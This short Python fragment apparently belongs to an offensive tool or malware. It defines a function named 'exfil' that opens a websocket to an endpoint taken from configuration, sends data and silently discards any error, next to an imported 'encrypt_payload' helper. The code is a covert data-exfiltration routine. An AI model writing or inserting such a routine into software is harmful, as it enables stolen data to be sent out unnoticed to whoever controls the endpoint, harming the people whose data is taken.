from core.crypto_ops import encrypt_payload
import websocket
from config import CONFIG

def exfil(data):
    try:
        ws = websocket.create_connection(CONFIG['websocket_endpoint'], timeout=5)
        ws.send(data)
        ws.close()
    except: pass